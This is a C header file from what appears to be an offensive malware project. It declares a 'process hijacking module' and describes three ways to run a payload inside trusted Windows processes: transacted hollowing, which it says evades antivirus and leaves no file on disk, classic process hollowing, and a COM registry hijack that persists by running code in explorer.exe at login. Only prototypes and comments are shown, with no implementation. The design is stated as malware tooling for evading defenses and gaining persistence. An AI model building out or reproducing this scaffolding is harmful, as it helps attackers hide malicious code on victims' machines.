/*
 * Process hijacking module — 3 techniques for injecting into trusted processes.
 *
 * Technique 1 — Transacted Hollowing (TxF):
 *   Creates an NTFS transaction, writes payload to a copy of a legit binary
 *   within the transaction, creates a process from it. AV sees the pre-replace
 *   content. Transaction is rolled back — no file left on disk.
 *   Works on: Win7 through most Win11 builds. Deprecated but functional.
 *
 * Technique 2 — Classic Process Hollowing:
 *   Creates a legitimate process in suspended state, unmaps its original
 *   image section, writes our payload into the allocated memory, sets the
 *   entry point, resumes. Old but reliable.
 *
 * Technique 3 — COM Hijack (persistence + execution):
 *   Registers a COM object under HKCU\Software\Classes\CLSID that points
 *   to our payload. When explorer.exe loads the COM object (e.g., on user
 *   login), our code runs within explorer's context.
 *
 * All three share a common helper: load_payload_image() which reads a PE
 * from disk or from an embedded resource and returns a PAYLOAD_IMAGE struct.
 */

#pragma once
#ifndef HOLLOW_H
#define HOLLOW_H

#include <windows.h>
#include "utils.h"

/* ── Technique 1: Transacted hollowing ── */
/* Returns 0 on success, nonzero on failure.
   On success, *phProcess and *pdwPid are set. */
int hollow_transacted_hijack(PHANDLE phProcess, PDWORD pdwPid);

/* ── Technique 2: Classic process hollowing ── */
int hollow_classic_hijack(PHANDLE phProcess, PDWORD pdwPid);

/* ── Technique 3: COM hijack — no process handle returned ── */
int hollow_com_hijack(void);

/* ── Internal: read a PE image into memory ── */
int load_payload_from_resource(PPAYLOAD_IMAGE pImage);

#endif /* HOLLOW_H */
